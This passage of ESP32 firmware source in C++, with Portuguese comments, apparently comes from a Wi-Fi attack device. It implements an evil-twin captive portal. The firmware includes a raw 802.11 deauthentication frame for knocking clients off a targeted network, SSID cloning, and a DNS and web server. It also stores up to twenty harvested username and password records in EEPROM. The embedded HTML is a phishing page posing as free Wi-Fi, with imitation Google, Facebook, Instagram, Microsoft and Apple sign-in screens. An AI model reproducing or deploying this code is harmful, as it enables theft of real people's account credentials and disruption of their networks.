      wifiReselectByBssid(s_liveBssid);
    } else if (lastScanning) {
      displayWiFiList(true);
    }
    lastDetailView = false;
    lastScanning = false;
  } else {
    if (!lastDetailView) {
      displayWiFiDetails();
    } else {
      liveRssiTick();
    }
    lastDetailView = true;
    }
  }
}

namespace CaptivePortal {

#define CP_LINE_HEIGHT 12
#define MAX_LINES 23

static unsigned long cportalLastBtnMs = 0;
static const unsigned long cportalDebounceMs = 200;
static constexpr int kCredRowsPerPage = 10;
static constexpr int kCredRowH = 18;   // 2 linhas por credencial

static bool s_cloneUiActive = false;
static bool s_clonePrevEn = false;
static bool s_cloneNextEn = false;
static bool s_clonePickMode = false;
static int s_cloneLastRenderedPage = -1;
static int s_cloneLastRenderedSel = -1;
static bool s_cloneLastPrevEn = false;
static bool s_cloneLastNextEn = false;

static constexpr int CP_CLONE_ROW_H = 22;
static constexpr int CP_CLONE_HINT_H = 12;
static constexpr int CP_CLONE_HEADER_BLOCK_H = 28;

static int cpCloneListAreaTop() {
  return kWifiBodyTop + 4;
}

static int cpCloneListAreaBottom() {
  return wifiListBottomY() - CP_CLONE_HINT_H;
}

static int cpCloneRowsPerPage() {
  const int listH = cpCloneListAreaBottom() - cpCloneListAreaTop() - CP_CLONE_HEADER_BLOCK_H;
  return max(1, listH / CP_CLONE_ROW_H);
}

static int cpCloneHeaderY() {
  const int rowsPerPage = cpCloneRowsPerPage();
  const int listH = rowsPerPage * CP_CLONE_ROW_H;
  const int total = CP_CLONE_HEADER_BLOCK_H + listH + CP_CLONE_HINT_H;
  const int avail = cpCloneListAreaBottom() - cpCloneListAreaTop();
  return cpCloneListAreaTop() + max(0, (avail - total) / 2);
}

static int cpCloneFirstRowY() {
  return cpCloneHeaderY() + CP_CLONE_HEADER_BLOCK_H;
}

enum class CpCloneAction { Wait, Back, Rescan, Pick, Prev, Next, ListTap, Exit };

static void cportalUpdateNavLabels();
static void cportalTeardown();
static void cportalHandleMainNavButtons();
static void cportalHandleCredNavButtons();
static void cportalHandleConfigNavButtons();
static void drawConfigMenu();
static int s_configSel = 0;
static void cpEditSsid();
static void cpStopDeauth();
static CpCloneAction cpCloneWaitInput(bool prevEnabled, bool nextEnabled, bool pickMode,
                                      int& tx, int& ty);
static void cpCloneEndUi();

const char* default_ssid = "ESP32DIV_AP";
char custom_ssid[32] = "ESP32DIV_AP";
const char* password = NULL;

static uint8_t ap_channel = 1;

static bool cp_deauth_active = false;
static wifi_ap_record_t cp_target_ap;
static uint8_t cp_target_channel;
static uint32_t cp_deauth_packet_count = 0;
static uint32_t cp_deauth_success_count = 0;
static unsigned long cp_last_deauth_time = 0;

static uint8_t cp_deauth_frame_default[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x00, 0x00,
    0x01, 0x00
};
static uint8_t cp_deauth_frame[sizeof(cp_deauth_frame_default)];
DNSServer dnsServer;
const byte DNS_PORT = 53;
WebServer server(80);

bool attackActive = false;

static void stopAttack();
static void startAttack();
void drawMainMenu();

// Layout do EEPROM (NVS): 0..31 SSID em uso | 32..3471 credenciais (20 x 172) |
// 3472 contador | 3476 pagina | 3520 origem do nome | 3524 nome custom | 3557 nome clonado.
// Cada credencial tem 172 bytes: username[64] + password[64] + ssid[32] + provider[12].
#define EEPROM_SIZE 3600
#define SSID_ADDR 0
#define CRED_ADDR 32
#define COUNT_ADDR 3472
#define MAX_CREDS 20
#define CRED_SIZE 172
#define CP_SOURCE_ADDR   3476
#define SSID_SRC_ADDR    3520   // 0 = Std (padrao da pagina), 1 = Custom, 2 = Clone
#define CUSTOM_SSID_ADDR 3524   // 32 chars + terminador
#define CLONE_SSID_ADDR  3557   // 32 chars + terminador

String terminalBuffer[MAX_LINES];
uint16_t colorBuffer[MAX_LINES];
int lineIndex = 0;

// `provider` guarda o botao usado no portal
// (google / facebook / instagram / microsoft / apple).
struct Credential {
  char username[64];
  char password[64];
  char ssid[32];
  char provider[12];
};
// Trava de seguranca: se alguem mudar os campos sem ajustar o CRED_SIZE, o
// build quebra aqui em vez de gravar lixo no EEPROM.
static_assert(sizeof(Credential) == CRED_SIZE, "Credential deve ter exatamente CRED_SIZE bytes");


enum Screen { MAIN_MENU, CRED_LIST, CONFIG_MENU };
Screen currentScreen = MAIN_MENU;
int credPage = 0;

String inputSSID = "";

const char* seriesSSIDs[] = {"ESP32DIV_AP", "FreeWiFi", "Loading..."};
const int numSeriesSSIDs = 3;
int seriesSSIDIndex = 0;

static const char* const kBuiltinLoginPage = R"CPORTAL(<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
<title>Wi-Fi Grátis - Acesso à Internet</title>
<style>
    :root {
        --mc-red: #DA291C;
        --mc-red-dark: #BD0017;
        --mc-red-deep: #C40B18;
        --mc-yellow: #FFC72C;
        --mc-brown: #27251F;
        --mc-cream: #F8F0E7;
        --mc-muted: #6F4E2E;
        --mc-line: #E7DCCD;
        --blue: #1a73e8;
        --blue-hover: #1765cc;
        --text-dark: #202124;
        --text-bright: #5f6368;
        --text-list: #3c4043;
        --border: #dadce0;
        --btn-border: #747775;
        --btn-text: #1f1f1f;
        --gray-hover: #f8f9fa;
        --gray-active: #f1f3f4;
        --rb: Roboto, 'Segoe UI', Arial, sans-serif;
        --gs: 'Google Sans', Roboto, 'Segoe UI', Arial, sans-serif;
        --mc-display: 'Arial Black', 'Arial Bold', 'Helvetica Neue', Helvetica, Arial, sans-serif;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { min-height: 100%; }
    body { font-family: var(--rb); font-size: 15px; color: var(--mc-brown); background: var(--mc-cream); }
    a { text-decoration: none; }
    img, svg { vertical-align: middle; }

    .screen { display: none; min-height: 100vh; min-height: 100dvh; position: relative; }

    /* botao "voltar" no canto: o CNA do iOS nao tem botao de voltar nenhum,
       entao a pagina precisa oferecer o proprio */
    .cp-back {
        position: absolute; top: 6px; left: 6px; z-index: 6;
        display: inline-flex; align-items: center;
        padding: 10px 12px; font-size: 14px; font-weight: 500; line-height: 1;
        color: #6b6b70; cursor: pointer; user-select: none;
        border-radius: 8px; -webkit-tap-highlight-color: transparent;
    }
    .cp-back:active { opacity: .55; background: rgba(0, 0, 0, .05); }
    .screen.active { display: flex; flex-direction: column; animation: fadein .25s ease; }
    @keyframes fadein { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }

    /* ================= TELA 1 — McDONALD'S ================= */
    #screen-landing { background: var(--mc-cream); }

    .hero {
        position: relative;
        background: linear-gradient(180deg, #D6231C 0%, var(--mc-red) 42%, var(--mc-red-deep) 100%);
        padding: 14px 18px 36px;
        text-align: center;
        overflow: hidden;
        z-index: 1;
    }
    /* "colina" creme que fecha a faixa vermelha, como na referência */
    .hero::after {
        content: '';
        position: absolute;
        left: -25%; right: -25%; bottom: -48px; height: 64px;
        background: var(--mc-cream);
        border-radius: 50% 50% 0 0 / 100% 100% 0 0;
        z-index: -1;
    }
    .arches { display: inline-block; line-height: 0; }
    .arches svg { display: block; width: 56px; height: auto; }

    .wordmark {
        display: block;
        margin-top: 12px;
        line-height: 0;
    }
    .wordmark svg { display: block; width: 160px; height: 18.4px; margin: 0 auto; }
    .sub {
        display: block;
        margin-top: 15px;
        font-family: var(--mc-display);
        font-weight: 900;
        font-size: 13px;
        line-height: 1;
        letter-spacing: 1.5px;
        text-transform: uppercase;
        color: var(--mc-yellow);
    }

    .card-wrap {
        flex: 1;
        width: 100%;
        padding: 0 10px;
        margin-top: -3px;
        position: relative;
        z-index: 2;
        display: flex;
        flex-direction: column;
    }
    .card {
        flex: 1;
        background: #fff;
        border-radius: 18px 18px 0 0;
        box-shadow: 0 -1px 16px rgba(39, 37, 31, .10);
        padding: 27px 24px 30px;
        text-align: center;
    }

    .wifi-badge {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        background: #fff;
        border: 2px solid var(--mc-yellow);
        color: var(--mc-red-dark);
        font-family: var(--rb);
        font-weight: 800;
        font-size: 12.5px;
        line-height: 1;
        letter-spacing: 1.2px;
        text-transform: uppercase;
        padding: 8px 16px 7px;
        border-radius: 999px;
    }
    .wifi-badge svg { width: 16px; height: 16px; flex-shrink: 0; }

    .card h1 {
        margin-top: 14px;
        font-family: var(--mc-display);
        font-weight: 900;
        font-size: 26px;
        line-height: 1.15;
        color: var(--mc-brown);
    }
    .card .lead {
        margin-top: 12px;
        font-size: 14.5px;
        line-height: 1.55;
        color: var(--mc-muted);
    }
    .card .lead strong { color: var(--mc-brown); font-weight: 700; }

    .divider {
        display: flex;
        align-items: center;
        gap: 12px;
        margin: 26px 0 18px;
        color: var(--mc-muted);
        font-size: 12px;
        font-weight: 500;
        letter-spacing: 1.4px;
        text-transform: uppercase;
    }
    .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--mc-line); }

    .terms {
        margin-top: 17px;
        font-size: 12px;
        line-height: 1.45;
        color: var(--mc-muted);
    }
    .terms a { color: var(--mc-red); font-weight: 700; }

    /* ---------- rodapé escuro ---------- */
    .mc-footer {
        background: var(--mc-brown);
        color: #fff;
        text-align: center;
        padding: 22px 16px 26px;
        font-size: 12px;
    }
    .mc-footer .f-arches { line-height: 0; }
    .mc-footer .f-arches svg { display: block; width: 30px; height: auto; margin: 0 auto 8px; }
    .mc-footer .brand { line-height: 0; }
    .mc-footer .brand svg { display: block; width: 116px; height: 13.4px; margin: 0 auto; }
    .mc-footer .tag { margin-top: 5px; color: rgba(255, 255, 255, .78); }
    .mc-footer ul {
        list-style: none;
        display: flex;
        justify-content: center;
        flex-wrap: wrap;
        gap: 18px;
        margin-top: 14px;
    }
    .mc-footer a { color: var(--mc-yellow); font-weight: 600; font-size: 12px; }
    .mc-footer .copy { margin-top: 14px; font-size: 11px; color: rgba(255, 255, 255, .55); }

    /* ================= TELAS 2 e 3 — GOOGLE ================= */
    #screen-email, #screen-password { background: #fff; }
    .g-main { flex: 1; width: 100%; max-width: 450px; margin: 0 auto; padding: 48px 24px 24px; }
    .g-logo { text-align: center; height: 24px; }
    .g-heading { text-align: center; margin-top: 16px; }
    .g-heading h1 { font-family: var(--gs); font-size: 24px; font-weight: 400; line-height: 32px; color: var(--text-dark); }
    .g-heading p { font-size: 16px; color: var(--text-dark); padding-top: 8px; letter-spacing: .1px; }

    .field { position: relative; padding-top: 8px; }
    .field input { width: 100%; height: 54px; font-family: var(--rb); font-size: 16px; color: var(--text-dark); padding: 13px 15px; border: 1px solid var(--border); border-radius: 4px; background: transparent; outline: none; transition: border-color .15s, box-shadow .15s; }
    .field input:hover { border-color: var(--text-dark); }
    .field input:focus { border-color: var(--blue); box-shadow: inset 0 0 0 1px var(--blue); }
    .field label { position: absolute; top: 21px; left: 15px; font-size: 16px; color: var(--text-bright); background: #fff; padding: 0 6px; pointer-events: none; transition: all .15s; }
    .field input:focus + label, .field input:not(:placeholder-shown) + label { top: -1px; left: 9px; font-size: 12px; color: var(--blue); }
    .field input:not(:focus):not(:placeholder-shown) + label { color: var(--text-bright); }

    .sublink { display: inline-block; padding: 9px 0 3px; font-size: 14px; color: var(--blue); font-weight: 500; }
    .guest-note { margin-top: 30px; color: var(--text-bright); line-height: 20px; }
    .guest-note a { color: var(--blue); font-weight: 500; padding: 0 3px; }
    .buttons { margin-top: 32px; width: 100%; display: flex; justify-content: space-between; align-items: center; }
    .btn-link { background: none; border: none; font-family: var(--gs); font-size: 14px; font-weight: 500; height: 36px; padding: 0 8px; color: var(--blue); cursor: pointer; }
    .btn-primary { background: var(--blue); border: none; font-family: var(--gs); font-size: 14px; font-weight: 500; letter-spacing: .25px; color: #fff; height: 36px; padding: 0 24px; border-radius: 4px; cursor: pointer; transition: background .15s, box-shadow .15s; }
    .btn-primary:hover { background: var(--blue-hover); box-shadow: 0 1px 2px rgba(60,64,67,.3); }
    .account { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 16px; }
    .avatar { width: 28px; height: 28px; border-radius: 50%; background: var(--text-bright); color: #fff; display: flex; align-items: center; justify-content: center; font-family: var(--gs); font-size: 14px; font-weight: 500; text-transform: uppercase; flex-shrink: 0; }
    .account .email { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 240px; color: var(--text-dark); }
    .account .edit { color: var(--blue); font-weight: 500; cursor: pointer; white-space: nowrap; }
    .show-pass { display: flex; align-items: center; gap: 8px; margin-top: 16px; cursor: pointer; user-select: none; color: var(--text-dark); }
    .show-pass input { width: 18px; height: 18px; accent-color: var(--blue); cursor: pointer; }

    .g-footer { font-size: 12px; }
    .g-footer .lang { display: flex; justify-content: flex-start; padding: 4px 16px; }
    .g-footer .lang select { border: none; font-family: var(--rb); font-size: 12px; color: var(--text-list); line-height: 28px; cursor: pointer; background: transparent; }
    .g-footer ul { padding-left: 8px; display: flex; list-style: none; flex-wrap: wrap; }
    .g-footer li { padding: 16px; }
    .g-footer a { color: var(--text-list); font-weight: 400; }

    /* ================= TELA 1 — BOTÕES DE PROVEDORES ================= */
    .providers { margin-top: 4px; }
    .provider-btn {
        display: flex; align-items: center; justify-content: center; gap: 10px;
        width: 100%; height: 44px; margin-top: 10px;
        border: 0; border-radius: 6px; cursor: pointer;
        font-family: var(--rb); font-size: 15px; font-weight: 600; letter-spacing: .2px;
        color: #fff; box-shadow: 0 1px 3px rgba(39, 37, 31, .22);
        -webkit-tap-highlight-color: transparent;
        transition: filter .15s;
    }
    .provider-btn:first-child { margin-top: 0; }
    .provider-btn:hover { filter: brightness(1.06); }
    .provider-btn:active { filter: brightness(.93); }
    .provider-btn svg { width: 21px; height: 21px; flex-shrink: 0; }
    .p-google { background: #4285F4; }
    .p-facebook { background: #1877F2; }
    .p-instagram { background: linear-gradient(45deg, #F09433 0%, #E6683C 25%, #DC2743 50%, #CC2366 75%, #BC1888 100%); }
    .p-microsoft { background: #2F2F2F; }
    .p-apple { background: #000; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }

    /* ================= TELAS 8 e 9 — APPLE ================= */
    #screen-apple-email, #screen-apple-password { background: #fff; }
    .ap-wrap { flex: 1; width: 100%; max-width: 420px; margin: 0 auto; padding: 44px 24px 30px; text-align: center; color: #1D1D1F;
               font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    .ap-logo { width: 40px; height: 40px; }
    .ap-title { margin-top: 20px; font-size: 24px; font-weight: 600; letter-spacing: -.3px; color: #1D1D1F; }
    .ap-card { margin-top: 26px; padding: 18px 18px 20px; background: #F5F5F7; border-radius: 12px; text-align: left; }
    .ap-label { display: block; margin-bottom: 8px; font-size: 15px; font-weight: 600; color: #1D1D1F; }
    .ap-input { display: block; width: 100%; height: 46px; padding: 0 14px; font-family: inherit; font-size: 16px; color: #1D1D1F;
                background: #fff; border: 1px solid #D2D2D7; border-radius: 8px; outline: none; box-sizing: border-box; }
    .ap-input::placeholder { color: #86868B; }
    .ap-input:focus { border-color: #0071E3; box-shadow: 0 0 0 3px rgba(0, 113, 227, .18); }
    .ap-btn { display: block; width: 100%; height: 46px; margin-top: 16px; background: #0071E3; border: 0; border-radius: 8px;
              color: #fff; font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; }
    .ap-btn:active { background: #0062C4; }
    .ap-err { margin: 10px 2px 0; text-align: left; font-size: 13px; color: #E30000; }
    .ap-link { display: block; margin-top: 20px; color: #0071E3; font-size: 14px; }
    .ap-account { display: flex; align-items: center; justify-content: center; gap: 10px; margin: 14px 0 2px; font-size: 15px; }
    .ap-account span { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .ap-account a { color: #0071E3; cursor: pointer; }
    .ap-new { margin-top: 28px; font-size: 14px; color: #6E6E73; }
    .ap-new a { color: #0071E3; }

    /* ================= TELA 4 — FACEBOOK ================= */
    #screen-facebook { background: #fff; }
    .fb-wrap { flex: 1; width: 100%; max-width: 420px; margin: 0 auto; padding: 40px 22px 26px; font-family: Helvetica, Arial, sans-serif; text-align: center; }
    .fb-logo svg { width: 46px; height: 46px; }
    .fb-word { margin-top: 2px; font-size: 27px; font-weight: 700; color: #1877F2; letter-spacing: -1.1px; }
    .fb-form { margin-top: 26px; }
    .fb-input { display: block; width: 100%; height: 52px; margin-bottom: 12px; padding: 0 16px; font-family: inherit; font-size: 16px; color: #1c1e21; background: #fff; border: 1px solid #CCD0D5; border-radius: 6px; outline: none; box-sizing: border-box; }
    .fb-input::placeholder { color: #90949c; }
    .fb-input:focus { border-color: #1877F2; box-shadow: 0 0 0 2px rgba(24, 119, 242, .15); }
    .fb-btn { display: block; width: 100%; height: 48px; background: #1877F2; border: 0; border-radius: 6px; color: #fff; font-family: inherit; font-size: 18px; font-weight: 700; cursor: pointer; }
    .fb-btn:active { background: #166FE5; }
    .fb-link { display: block; margin-top: 18px; color: #1877F2; font-size: 15px; }
    .fb-sep { display: flex; align-items: center; gap: 12px; margin: 20px 0; color: #90949c; font-size: 13px; }
    .fb-sep::before, .fb-sep::after { content: ''; flex: 1; height: 1px; background: #DADDE1; }
    .fb-new { display: block; width: 210px; height: 44px; margin: 0 auto; line-height: 44px; background: #00A400; border-radius: 6px; color: #fff; font-size: 16px; font-weight: 700; }
    .fb-new:active { background: #009100; }
    .fb-foot { margin-top: 34px; font-size: 12px; color: #90949c; }

    /* ================= TELA 5 — INSTAGRAM ================= */
    #screen-instagram { background: #fff; }
    .ig-wrap { flex: 1; width: 100%; max-width: 380px; margin: 0 auto; padding: 52px 26px 26px; text-align: center; font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif; }
    .ig-logo { width: 64px; height: 64px; }
    .ig-form { margin-top: 28px; }
    .ig-input { display: block; width: 100%; height: 44px; margin-bottom: 8px; padding: 0 12px; font-family: inherit; font-size: 14px; color: #262626; background: #FAFAFA; border: 1px solid #DBDBDB; border-radius: 4px; outline: none; box-sizing: border-box; }
    .ig-input::placeholder { color: #8e8e8e; }
    .ig-input:focus { background: #fff; border-color: #a8a8a8; }
    .ig-btn { display: block; width: 100%; height: 44px; margin-top: 14px; background: #0095F6; border: 0; border-radius: 8px; color: #fff; font-family: inherit; font-size: 15px; font-weight: 600; cursor: pointer; }
    .ig-btn:active { background: #1877F2; }
    .ig-or { display: flex; align-items: center; gap: 16px; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
    .ig-or::before, .ig-or::after { content: ''; flex: 1; height: 1px; background: #DBDBDB; }
    .ig-fb { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-size: 15px; font-weight: 600; }
    .ig-forgot { display: block; margin-top: 18px; color: #385185; font-size: 13px; }
    .ig-foot { margin-top: 40px; color: #8e8e8e; font-size: 12px; }

    /* ================= TELAS 6 e 7 — MICROSOFT ================= */
    #screen-ms-email, #screen-ms-password { background: #fff; }
    .ms-wrap { flex: 1; width: 100%; max-width: 460px; margin: 0 auto; padding: 46px 26px 30px; font-family: 'Segoe UI', Tahoma, Verdana, Arial, sans-serif; }
    .ms-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 24px; }
    .ms-logo svg { width: 22px; height: 22px; }
    .ms-logo span { font-size: 19px; font-weight: 600; color: #5E5E5E; }
    .ms-title { font-size: 24px; font-weight: 600; color: #1B1B1B; }
    .ms-input { display: block; width: 100%; margin-top: 22px; padding: 6px 2px; font-family: inherit; font-size: 15px; color: #1B1B1B; background: transparent; border: 0; border-bottom: 1px solid #666; outline: none; box-sizing: border-box; }
    .ms-input::placeholder { color: #666; }
    .ms-input:focus { border-bottom-color: #0067B8; }
    .ms-link { display: inline-block; margin-top: 18px; color: #0067B8; font-size: 13px; }
    .ms-actions { margin-top: 32px; }
    .ms-btn { width: 100%; height: 36px; background: #0067B8; border: 0; color: #fff; font-family: inherit; font-size: 15px; cursor: pointer; }
    .ms-btn:active { background: #005DA6; }
    .ms-new { margin-top: 28px; font-size: 14px; }
    .ms-new a { color: #1B1B1B; }
    .ms-back { display: flex; align-items: center; gap: 8px; margin-bottom: 20px; font-size: 15px; color: #1B1B1B; cursor: pointer; }
    .ms-back span { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .ms-back svg { width: 18px; height: 18px; flex-shrink: 0; }

    /* ---------- mensagens de erro de validação ---------- */
    .form-err { display: none; text-align: left; line-height: 1.35; }
    .form-err.show { display: block; }
    .fb-err { margin: -6px 0 12px; font-family: Helvetica, Arial, sans-serif; font-size: 13px; color: #f02849; }
    .ig-err { margin: 0 0 8px; font-size: 12px; color: #ed4956; }
    .ms-err { margin: 8px 0 0; font-size: 13px; color: #a80000; }

    .spinner-overlay { position: fixed; inset: 0; background: rgba(255,255,255,.85); display: none; align-items: center; justify-content: center; z-index: 50; }
    .spinner-overlay.show { display: flex; }
    .spinner { width: 32px; height: 32px; border: 3px solid var(--border); border-top-color: var(--blue); border-radius: 50%; animation: spin .8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    /* ===== TEMA: página genérica (Wi-Fi Grátis) ===== */
    :root {
        --mc-red: #1D4ED8;
        --mc-red-dark: #1E40AF;
        --mc-red-deep: #1E3A8A;
        --mc-yellow: #7DD3FC;
        --mc-brown: #0F172A;
        --mc-cream: #F1F5F9;
        --mc-muted: #475569;
        --mc-line: #CBD5E1;
        --mc-display: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }
    .hero { background: linear-gradient(180deg, #2563EB 0%, var(--mc-red) 45%, var(--mc-red-deep) 100%); }
    .arches svg { width: 52px; height: auto; }
    .wordmark { line-height: 1.15; }
    .wm-text { display: block; font-family: var(--mc-display); font-weight: 800; font-size: 29px; letter-spacing: -.5px; color: #fff; }
    .mc-footer .brand { line-height: 1.25; font-family: var(--mc-display); font-weight: 800; font-size: 16px; letter-spacing: -.2px; }
    .mc-footer .f-arches svg { width: 26px; }

</style>
</head>
<body>

    <!-- ============ TELA 1 — McDONALD'S ============ -->
    <section class="screen active" id="screen-landing">
        <header class="hero">
            <span class="arches"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#7DD3FC" d="M12 20.6a1.7 1.7 0 1 0 0-3.4 1.7 1.7 0 0 0 0 3.4z"/><path fill="#7DD3FC" d="M12 13.4a7.9 7.9 0 0 1 5.6 2.3l1.8-1.8a10.4 10.4 0 0 0-14.8 0l1.8 1.8A7.9 7.9 0 0 1 12 13.4z"/><path fill="#7DD3FC" d="M12 8a13.4 13.4 0 0 1 9.5 3.9l1.8-1.8a16 16 0 0 0-22.6 0L2.5 11.9A13.4 13.4 0 0 1 12 8z"/></svg></span>
            <span class="wordmark"><span class="wm-text">Wi-Fi Grátis</span></span>
            <span class="sub">Acesso à Internet</span>
        </header>

        <div class="card-wrap">
            <div class="card">
                <span class="wifi-badge">
                    <svg viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                        <path d="M12 20.2a2.1 2.1 0 1 0 0-4.2 2.1 2.1 0 0 0 0 4.2z" />
                        <path d="M12 13.6c-1.6 0-3.1.6-4.2 1.6l1.5 1.5a3.8 3.8 0 0 1 5.4 0l1.5-1.5a6 6 0 0 0-4.2-1.6z" />
                        <path d="M12 9.2c-3 0-5.7 1.2-7.7 3.1l1.5 1.5A8.8 8.8 0 0 1 12 11.3c2.4 0 4.6.9 6.2 2.5l1.5-1.5A10.9 10.9 0 0 0 12 9.2z" />
                        <path d="M12 4.8c-4.2 0-8 1.6-10.9 4.3l1.5 1.5A13.4 13.4 0 0 1 12 7c3.7 0 7 1.4 9.4 3.6l1.5-1.5A15.5 15.5 0 0 0 12 4.8z" />
                    </svg>
                    Wi-Fi Grátis
                </span>

                <h1>Bem-vindo(a)!</h1>
                <p class="lead">Para navegar na internet gratuita, é necessário se identificar. É rápido e seguro.</p>

                <div class="divider">Identifique-se</div>

                <div class="providers">
                    <button type="button" class="provider-btn p-google" id="btnGoogle">
                        <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M12.24 10.285V14.4h6.806c-.275 1.765-2.056 5.174-6.806 5.174-4.095 0-7.439-3.389-7.439-7.574s3.344-7.574 7.439-7.574c2.33 0 3.891.989 4.785 1.849l3.254-3.138C18.189 1.186 15.479 0 12.24 0c-6.635 0-12 5.365-12 12s5.365 12 12 12c6.926 0 11.52-4.869 11.52-11.726 0-.788-.085-1.39-.189-1.989H12.24z"/></svg>
                        Continuar com o Google
                    </button>
                    <button type="button" class="provider-btn p-facebook" id="btnFacebook">
                        <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M15.12 5.32H17V2.14A26.11 26.11 0 0 0 14.26 2C11.54 2 9.68 3.66 9.68 6.7v2.62H6.61v3.56h3.07V22h3.68v-9.12h3.06l.46-3.56h-3.52V7.05c0-1.03.28-1.73 1.76-1.73z"/></svg>
                        Continuar com o Facebook
                    </button>
                    <button type="button" class="provider-btn p-instagram" id="btnInstagram">
                        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" aria-hidden="true"><rect x="2.6" y="2.6" width="18.8" height="18.8" rx="5.4"/><circle cx="12" cy="12" r="4.5"/><circle cx="17.6" cy="6.4" r="1.2" fill="#fff" stroke="none"/></svg>
                        Continuar com o Instagram
                    </button>
                    <button type="button" class="provider-btn p-microsoft" id="btnMicrosoft">
                        <svg viewBox="0 0 23 23" aria-hidden="true"><rect width="10.5" height="10.5" fill="#F25022"/><rect x="12.5" width="10.5" height="10.5" fill="#7FBA00"/><rect y="12.5" width="10.5" height="10.5" fill="#00A4EF"/><rect x="12.5" y="12.5" width="10.5" height="10.5" fill="#FFB900"/></svg>
                        Continuar com a Microsoft
                    <button type="button" class="provider-btn p-apple" id="btnApple">
                        <svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
                        Continuar com a Apple
                    </button>
                </div>

                <p class="terms">Ao continuar, você concorda com os <a href="#" onclick="return false">Termos de Uso</a> e a <a href="#" onclick="return false">Política de Privacidade</a>.</p>
            </div>
        </div>

        <footer class="mc-footer">
            <div class="f-arches"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="#7DD3FC" d="M12 20.6a1.7 1.7 0 1 0 0-3.4 1.7 1.7 0 0 0 0 3.4z"/><path fill="#7DD3FC" d="M12 13.4a7.9 7.9 0 0 1 5.6 2.3l1.8-1.8a10.4 10.4 0 0 0-14.8 0l1.8 1.8A7.9 7.9 0 0 1 12 13.4z"/><path fill="#7DD3FC" d="M12 8a13.4 13.4 0 0 1 9.5 3.9l1.8-1.8a16 16 0 0 0-22.6 0L2.5 11.9A13.4 13.4 0 0 1 12 8z"/></svg></div>
            <div class="brand">Wi-Fi Grátis</div>
            <div class="tag">Internet liberada para visitantes</div>
            <ul>
                <li><a href="#" onclick="return false">Fale Conosco</a></li>
                <li><a href="#" onclick="return false">Privacidade</a></li>
                <li><a href="#" onclick="return false">Termos</a></li>
            </ul>
            <div class="copy">&copy; 2026 Wi-Fi Grátis</div>
        </footer>
    </section>

    <!-- ============ TELA 2 — GOOGLE E-MAIL ============ -->
    <section class="screen" id="screen-email">
        <a class="cp-back" onclick="goBack()">&#8249; Voltar</a>
        <main class="g-main">
            <div class="g-logo">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                    <g><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"/></g>
                    <g><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"/></g>
                    <g><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"/></g>
